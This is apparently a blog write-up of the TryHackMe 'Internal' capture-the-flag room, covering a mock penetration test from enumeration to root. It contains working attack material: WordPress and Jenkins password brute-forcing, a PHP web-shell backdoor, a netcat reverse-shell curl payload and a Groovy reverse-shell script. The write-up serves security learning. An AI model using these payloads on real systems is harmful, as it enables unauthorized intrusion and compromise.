---
layout: post
title: TryHackMe - Internal 
---

[Internal](https://tryhackme.com/room/internal) is a room on TryHackMe where you get to perform a mock penetration test. The room's introduction provides the scope of the engagement:



Scope of Work

The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

- User.txt
- Root.txt

Additionally, the client has provided the following scope allowances:

- Ensure that you modify your hosts file to reflect internal.thm
- Any tools or techniques are permitted in this engagement
- Locate and note all vulnerabilities found
- Submit the flags discovered to the dashboard
- Only the IP address assigned to your machine is in scope



# ENUMERATION

I'll start with a rustscan to see what ports are open. You can find rustscan [here](https://github.com/RustScan/RustScan).

<img src="/images/Internal/rustscan.gif" class="center-image" />

I'm also going to add the ip address to my /etc/hosts file:
```
10.10.110.112 internal.thm
```

The scan comes back with two ports open:
```
kali@kali:$ rustscan --ulimit 5000 internal.thm

--- snip ---

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

Navigating to `http://internal.thm` returns a default apache page.

<img src="/images/Internal/Apache.png" class="center-image" />

Now I'll run gobuster to see if I can find any interesting directories on the webserver:
```
kali@kali:$ gobuster dir --url http://internal.thm/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://internal.thm/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/07 18:29:46 Starting gobuster
===============================================================
/blog (Status: 301)
/wordpress (Status: 301)
/javascript (Status: 301)
/phpmyadmin (Status: 301)
```  

 It look like there's a Wordpress blog running on the box. Navigating to /blog returns the front page for the blog:

<img src="/images/Internal/blog.png" class="center-image" />



And I can get to the default wordpress login at `http://internal.thm/blog/wp-login.php`:

<img src="/images/Internal/login.png" class="center-image" />

My go-to tool for enumerating Wordpress sites is [wpscan](https://wpscan.org/). I'll run wpscan to see if I can find any users on the site and brute force their password.
```
kali@kali:$ wpscan --enumerate u --passwords /usr/share/wordlists/rockyou.txt --url http://internal.thm/wordpress/

--- snip ---

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Login Error Messages (Aggressive Detection)

--- snip --- 

[+] Performing password attack on Xmlrpc against 1 user/s
Trying admin / my2boys Time: 00:06:03 <=================================================================================================================================================================> (3885 / 3885) 100.00% Time: 00:06:03

[SUCCESS] - admin / --redacted--                                                                                                                                                                                                                   

[!] Valid Combinations Found:
 | Username: admin, Password: --redacted--
```

# EXPLOITATION

The scan returns the admin user and their password! I'll use these creds to login to the admin panel. From here, I can use the "Theme Editor" to create a php backdoor by replacing the code for the `404.php` page.

<img src="/images/Internal/ThemeEdit.png" class="center-image" />

I'll use the following code for the backdoor:
```
<?php system($_REQUEST['pwned']); ?>
```

I'll visit `http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php?pwned=id` to confirm that I have code execution.

<img src="/images/Internal/Backdoor.png" class="center-image" />

I can now use the following curl command to get a reverse shell on the box with netcat:
```
curl "http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php" --data-urlencode "pwned=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.4.244 53 >/tmp/f
```


And I can catch the shell with netcat on my kali box.

<img src="/images/Internal/Internal_shell.gif" class="center-image" />



# PRIVILEGE ESCALATION

I now have a shell as www-data and need to escalate my privileges to root. I can see that there is a user "aubreanna" on the box, but I don't have access to her home directory. 
```
$ ls -la /home        
total 12
drwxr-xr-x  3 root      root      4096 Aug  3 01:40 .
drwxr-xr-x 24 root      root      4096 Aug  3 01:31 ..
drwx------  7 aubreanna aubreanna 4096 Aug  3 03:57 aubreanna
```

However, I do find an interesting file named `wp-save.txt` in the /opt directory that gives me a hint on where to look next: 
```
$ cat /opt/wp-save.txt

Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna: --redacted--
```

I can use these credentials to ssh in as user Aubreanna:
```
root@ip-10-10-111-47:~# ssh aubreanna@internal.thm

aubreanna@internal.thm's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

aubreanna@internal:~$ ls -l
total 12
-rwx------ 1 aubreanna aubreanna   55 Aug  3 03:57 jenkins.txt
drwx------ 3 aubreanna aubreanna 4096 Aug  3 01:41 snap
-rwx------ 1 aubreanna aubreanna   21 Aug  3 03:56 user.txt
```

From here I can read the user flag and get my next hint from the `jenkins.txt` file:
```
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080
```

I can't get to the Jenkins server from my kali box, but I can reach it from the internal.thm host. Since I have ssh access the the internal.thm box, I can create an ssh tunnel to get to the Jenkins server:
```
ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm
```

Once again, I'll have to brute force for the admin password. I guessed the username of 'admin' and used rockyou.txt for my password wordlist. I'll perform the bruteforce attack with BurpSuite. I can intercept the login request and send it to intruder. Within intruder, I can mark the password field as the target, load the wordlist, and begin the attack:


Intercepting the request:

 <img src="/images/Internal/intercept.png" class="center-image" />


Marking the password field:

 <img src="/images/Internal/intruder1.png" class="center-image" />


Loading the wordlist and beginning the attack:

 <img src="/images/Internal/intruder2.png" class="center-image" />


I can sort by HTTP response length to find the successful login request and corresponding password:   

<img src="/images/Internal/intruder3.png" class="center-image" />


I'm not too familiar with Jenkins, but I did some googling and found that there is a script console that allows admins to execute commands on the server. 

<img src="/images/Internal/JenkinsMenu.png" class="center-image" />

All scripts must be written in Groovy script.

<img src="/images/Internal/JenkinsScriptConsole.png" class="center-image" />

I was able to find this [Groovy script reverse shell](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) on Github and get a reverse shell on my Kali box. I'll modify the host, port, and cmd variables to match my target:
```groovy
String host="10.10.111.47";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

```
kali@kali:$ nc -lvnp 4444

whoami
jenkins

id
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
```

I'll once again enumerate the /opt directory to find another clue:
```
cd /opt

ls
note.txt

cat note.txt

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:--redacted--
``` 

And now I can ssh as root and grab the root flag :)

# CONCLUSION

Internal was a pretty easy room, but fun nonetheless. I enjoyed getting to learn more about Jenkins and sniping admin passwords. I plan on doing more TryHackMe room write-ups very soon. Thanks for reading!

Feel free to reach out to me [on Twitter](https://twitter.com/Bad_Jubies) if you have any questions.
